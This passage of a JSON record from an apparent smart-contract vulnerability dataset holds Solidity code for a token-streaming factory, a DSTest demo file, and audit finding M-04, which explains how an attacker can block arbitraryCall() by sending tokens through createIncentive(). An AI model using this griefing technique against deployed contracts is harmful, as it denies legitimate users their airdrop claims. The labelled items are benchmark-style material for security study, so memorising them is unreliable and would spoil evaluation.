balances\n        uint256 preDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n        uint256 preRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n\n        (bool success, bytes memory _ret) = who.call(data);\n        require(success);\n\n        // require no change in balances\n        uint256 postDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n        uint256 postRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n        require(preDepositTokenBalance == postDepositTokenBalance && preRewardTokenBalance == postRewardTokenBalance, \"erc\");\n    }\n}\n\ncontract StreamFactory is Governed {\n\n    // ======= Structs ========\n    struct GovernableStreamParams {\n        uint32 maxDepositLockDuration;\n        uint32 maxRewardLockDuration;\n        uint32 maxStreamDuration;\n        uint32 minStreamDuration;\n    }\n\n    struct GovernableFeeParams {\n        uint16 feePercent;\n        bool feeEnabled;\n    }\n\n    // ======= Storage ========\n    GovernableStreamParams public streamParams;\n    GovernableFeeParams public feeParams;\n    uint64 public currStreamId; \n\n    uint16 constant MAX_FEE_PERCENT = 500; // 500/10000 == 5%\n\n    // =======  Events  =======\n    event StreamCreated(uint256 indexed stream_id, address stream_addr);\n    event StreamParametersUpdated(GovernableStreamParams oldParams, GovernableStreamParams newParams);\n    event FeeParametersUpdated(GovernableFeeParams oldParams, GovernableFeeParams newParams);\n\n    constructor(address _governor, address _emergency_governor) public Governed(_governor, _emergency_governor) {\n        streamParams = GovernableStreamParams({\n            maxDepositLockDuration: 52 weeks,\n            maxRewardLockDuration: 52 weeks,\n            maxStreamDuration: 2 weeks,\n            minStreamDuration: 1 hours\n        });\n    }\n\n    /**\n     * @dev Deploys a minimal contract pointing to streaming logic. This contract will also be the token contract\n     * for the receipt token. It custodies the depositTokens until depositLockDuration is complete. After\n     * lockDuration is completed, the depositTokens can be claimed by the original depositors\n     * \n    **/\n    function createStream(\n        address rewardToken,\n        address depositToken,\n        uint32 startTime,\n        uint32 streamDuration,\n        uint32 depositLockDuration,\n        uint32 rewardLockDuration,\n        bool isSale\n    )\n        public\n        returns (Stream)\n    {\n        // perform checks\n\n        {\n            require(startTime >= block.timestamp, \"past\");\n            require(streamDuration >= streamParams.minStreamDuration && streamDuration <= streamParams.maxStreamDuration, \"stream\");\n            require(depositLockDuration <= streamParams.maxDepositLockDuration, \"lock\");\n            require(rewardLockDuration <= streamParams.maxRewardLockDuration, \"reward\");\n        }\n        \n\n        // TODO: figure out sane salt, i.e. streamid + x? streamid guaranteed to be unique\n        uint64 that_stream = currStreamId;\n        currStreamId += 1;\n        bytes32 salt = bytes32(uint256(that_stream));\n\n        Stream stream = new Stream{salt: salt}(\n            that_stream,\n            msg.sender,\n            isSale,\n            rewardToken,\n            depositToken,\n            startTime,\n            streamDuration,\n            depositLockDuration,\n            rewardLockDuration,\n            feeParams.feePercent,\n            feeParams.feeEnabled\n        );\n\n        emit StreamCreated(that_stream, address(stream));\n\n        return stream;\n    }\n\n    function updateStreamParams(GovernableStreamParams memory newParams) public governed {\n        // DATA VALIDATION:\n        //  there is no real concept of \"sane\" limits here, and if misconfigured its ultimated\n        //  not a massive deal so no data validation is done\n        GovernableStreamParams memory old = streamParams;\n        streamParams = newParams;\n        emit StreamParametersUpdated(old, newParams);\n    }\n\n    function updateFeeParams(GovernableFeeParams memory newFeeParams) public governed {\n        require(newFeeParams.feePercent <= MAX_FEE_PERCENT, \"fee\");\n        GovernableFeeParams memory old = feeParams;\n        feeParams = newFeeParams;\n        emit FeeParametersUpdated(old, newFeeParams);\n    }\n}\n\n\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity >=0.4.23;\n\nimport \"../src/test.sol\";\n\ncontract DemoTest is DSTest {\n    function test_this() public pure {\n        require(true);\n    }\n    function test_logs() public {\n        emit log(\"-- log(string)\");\n        emit log(\"a string\");\n\n        emit log(\"-- log_named_uint(string, uint)\");\n        log_named_uint(\"uint\", 512);\n\n        emit log(\"-- log_named_int(string, int)\");\n        log_named_int(\"int\", -512);\n\n        emit log(\"-- log_named_address(string, address)\");\n        log_named_address(\"address\", address(this));\n\n        emit log(\"-- log_named_bytes32(string, bytes32)\");\n        log_named_bytes32(\"bytes32\", \"a string\");\n\n        emit log(\"-- log_named_bytes(string, bytes)\");\n        log_named_bytes(\"bytes\", hex\"cafefe\");\n\n        emit log(\"-- log_named_string(string, string)\");\n        log_named_string(\"string\", \"a string\");\n\n        emit log(\"-- log_named_decimal_uint(string, uint, uint)\");\n        log_named_decimal_uint(\"decimal uint\", 1.0e18, 18);\n\n        emit log(\"-- log_named_decimal_int(string, int, uint)\");\n        log_named_decimal_int(\"decimal int\", -1.0e18, 18);\n    }\n    event log_old_named_uint(bytes32,uint);\n    function test_old_logs() public {\n        log_old_named_uint(\"key\", 500);\n        log_named_bytes32(\"bkey\", \"val\");\n    }\n    function test_trace() public view {\n        this.echo(\"string 1\", \"string 2\");\n    }\n    function test_multiline() public {\n        emit log(\"a multiline\\\\n\" \"string\");\n        emit log(\"a multiline \" \"string\");\n        log_bytes(\"a string\");\n        log_bytes(\"a multiline\\n\" \"string\");\n        log_bytes(\"a multiline\\\\n\" \"string\");\n        emit log(unicode\"\u038f\");\n        logs(hex\"0000\");\n        log_named_bytes(\"0x0000\", hex\"0000\");\n        logs(hex\"ff\");\n    }\n    function echo(string memory s1, string memory s2) public pure\n        returns (string memory, string memory)\n    {\n        return (s1, s2);\n    }\n\n    function prove_this(uint x) public {\n        log_named_uint(\"sym x\", x);\n        assertGt(x + 1, 0);\n    }\n\n    function test_logn() public {\n        assembly {\n            log0(0x01, 0x02)\n            log1(0x01, 0x02, 0x03)\n            log2(0x01, 0x02, 0x03, 0x04)\n            log3(0x01, 0x02, 0x03, 0x04, 0x05)\n        }\n    }\n\n    event MyEvent(uint, uint indexed, uint, uint indexed);\n    function test_events() public {\n        emit MyEvent(1, 2, 3, 4);\n    }\n\n    function test_asserts() public {\n        string memory err = \"this test has failed!\";\n        emit log(\"## assertTrue(bool)\\n\");\n        assertTrue(false);\n        emit log(\"\\n\");\n        assertTrue(false, err);\n\n        emit log(\"\\n## assertEq(address,address)\\n\");\n        assertEq(address(this), msg.sender);\n        emit log(\"\\n\");\n        assertEq(address(this), msg.sender, err);\n\n        emit log(\"\\n## assertEq32(bytes32,bytes32)\\n\");\n        assertEq32(\"bytes 1\", \"bytes 2\");\n        emit log(\"\\n\");\n        assertEq32(\"bytes 1\", \"bytes 2\", err);\n\n        emit log(\"\\n## assertEq(bytes32,bytes32)\\n\");\n        assertEq32(\"bytes 1\", \"bytes 2\");\n        emit log(\"\\n\");\n        assertEq32(\"bytes 1\", \"bytes 2\", err);\n\n        emit log(\"\\n## assertEq(uint,uint)\\n\");\n        assertEq(uint(0), 1);\n        emit log(\"\\n\");\n        assertEq(uint(0), 1, err);\n\n        emit log(\"\\n## assertEq(int,int)\\n\");\n        assertEq(-1, -2);\n        emit log(\"\\n\");\n        assertEq(-1, -2, err);\n\n        emit log(\"\\n## assertEqDecimal(int,int,uint)\\n\");\n        assertEqDecimal(-1.0e18, -1.1e18, 18);\n        emit log(\"\\n\");\n        assertEqDecimal(-1.0e18, -1.1e18, 18, err);\n\n        emit log(\"\\n## assertEqDecimal(uint,uint,uint)\\n\");\n        assertEqDecimal(uint(1.0e18), 1.1e18, 18);\n        emit log(\"\\n\");\n        assertEqDecimal(uint(1.0e18), 1.1e18, 18, err);\n\n        emit log(\"\\n## assertGt(uint,uint)\\n\");\n        assertGt(uint(0), 0);\n        emit log(\"\\n\");\n        assertGt(uint(0), 0, err);\n\n        emit log(\"\\n## assertGt(int,int)\\n\");\n        assertGt(-1, -1);\n        emit log(\"\\n\");\n        assertGt(-1, -1, err);\n\n        emit log(\"\\n## assertGtDecimal(int,int,uint)\\n\");\n        assertGtDecimal(-2.0e18, -1.1e18, 18);\n        emit log(\"\\n\");\n        assertGtDecimal(-2.0e18, -1.1e18, 18, err);\n\n        emit log(\"\\n## assertGtDecimal(uint,uint,uint)\\n\");\n        assertGtDecimal(uint(1.0e18), 1.1e18, 18);\n        emit log(\"\\n\");\n        assertGtDecimal(uint(1.0e18), 1.1e18, 18, err);\n\n        emit log(\"\\n## assertGe(uint,uint)\\n\");\n        assertGe(uint(0), 1);\n        emit log(\"\\n\");\n        assertGe(uint(0), 1, err);\n\n        emit log(\"\\n## assertGe(int,int)\\n\");\n        assertGe(-1, 0);\n        emit log(\"\\n\");\n        assertGe(-1, 0, err);\n\n        emit log(\"\\n## assertGeDecimal(int,int,uint)\\n\");\n        assertGeDecimal(-2.0e18, -1.1e18, 18);\n        emit log(\"\\n\");\n        assertGeDecimal(-2.0e18, -1.1e18, 18, err);\n\n        emit log(\"\\n## assertGeDecimal(uint,uint,uint)\\n\");\n        assertGeDecimal(uint(1.0e18), 1.1e18, 18);\n        emit log(\"\\n\");\n        assertGeDecimal(uint(1.0e18), 1.1e18, 18, err);\n\n        emit log(\"\\n## assertLt(uint,uint)\\n\");\n        assertLt(uint(0), 0);\n        emit log(\"\\n\");\n        assertLt(uint(0), 0, err);\n\n        emit log(\"\\n## assertLt(int,int)\\n\");\n        assertLt(-1, -1);\n        emit log(\"\\n\");\n        assertLt(-1, -1, err);\n\n        emit log(\"\\n## assertLtDecimal(int,int,uint)\\n\");\n        assertLtDecimal(-1.0e18, -1.1e18, 18);\n        emit log(\"\\n\");\n        assertLtDecimal(-1.0e18, -1.1e18, 18, err);\n\n        emit log(\"\\n## assertLtDecimal(uint,uint,uint)\\n\");\n        assertLtDecimal(uint(2.0e18), 1.1e18, 18);\n        emit log(\"\\n\");\n        assertLtDecimal(uint(2.0e18), 1.1e18, 18, err);\n\n        emit log(\"\\n## assertLe(uint,uint)\\n\");\n        assertLe(uint(1), 0);\n        emit log(\"\\n\");\n        assertLe(uint(1), 0, err);\n\n        emit log(\"\\n## assertLe(int,int)\\n\");\n        assertLe(0, -1);\n        emit log(\"\\n\");\n        assertLe(0, -1, err);\n\n        emit log(\"\\n## assertLeDecimal(int,int,uint)\\n\");\n        assertLeDecimal(-1.0e18, -1.1e18, 18);\n        emit log(\"\\n\");\n        assertLeDecimal(-1.0e18, -1.1e18, 18, err);\n\n        emit log(\"\\n## assertLeDecimal(uint,uint,uint)\\n\");\n        assertLeDecimal(uint(2.0e18), 1.1e18, 18);\n        emit log(\"\\n\");\n        assertLeDecimal(uint(2.0e18), 1.1e18, 18, err);\n\n        emit log(\"\\n## assertEq(string,string)\\n\");\n        string memory s1 = \"string 1\";\n        string memory s2 = \"string 2\";\n        assertEq(s1, s2);\n        emit log(\"\\n\");\n        assertEq(s1, s2, err);\n\n        emit log(\"\\n## assertEq0(bytes,bytes)\\n\");\n        assertEq0(hex\"abcdef01\", hex\"abcdef02\");\n        log(\"\\n\");\n        assertEq0(hex\"abcdef01\", hex\"abcdef02\", err);\n    }\n}\n\ncontract DemoTestWithSetUp {\n    function setUp() public {\n    }\n    function test_pass() public pure {\n    }\n}\n\n\n",
        "CodeNames": [
            "Locke.sol",
            "demo.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "M-04",
                "Location": [
                    "claimIncentive()",
                    "require(incentives[who] ==",
                    "arbitraryCall()",
                    "createIncentive()",
                    "incentives[who]",
                    "require(block.timestamp = endStream, \"stream\");"
                ],
                "Type": " arbitraryCall() can get blocked by an attacker",
                "Description": "\n\narbitraryCall()'s (L733) use case is to claim airdrops by \"gov\". If the address \"who\" is a token that could be send as an incentive by an attacker via createIncentive() then such claim can be made unusable, because on L735 there is a require(incentives[who] == 0, \"inc\"); that reverts if a \"who\" token was received as an incentive.\n\nIn this case the the incentives[who] can be set to 0 by the stream creator by calling claimIncentive() but only after the stream has ended according to require(block.timestamp = endStream, \"stream\"); (L520)\n\nIf the airdrop is only claimable before the end of the stream, then the airdrop can never be claimed.\n\nIf \"gov\" is not the stream creator then the stream creator must become also the \"gov\" because claimIncentive() only can be called by the stream creator and the arbitraryCall() only by \"gov\". If resetting incentives[who] to 0 by calling claimIncentive() and arbitraryCall() for the \"who\" address doesn't happen atomic, an attacker can send between those two calls again a \"who\" token.\n\n\n<https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L733\n\n<https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L500\n\n",
                "Repair": "\n*   Best option at the moment I can think of is to accept the risk but clearly communicate to users that this can happen\n\nbrockelmore (Streaming Protocol) acknowledged(https://github.com/code-423n4/2021-11-streaming-findings/issues/47#issuecomment-984102392):\n  Yep this is the tradeoff being made. To maintain trustlessness, we cannot remove the incentives[who] == 0 check. Additionally, governance shouldn't be in charge of an arbitrary stream's recoverTokens function. \n \n The upshot of this is most MerkleDrop contracts are generally external of the token itself and not baked into the ERC20 itself. If a user wants to grief governance, they could continuously createIncentive after the stream creator claims the previous. But it does cost the user.\n\n\n\n\n"
            }
        ]
    }
]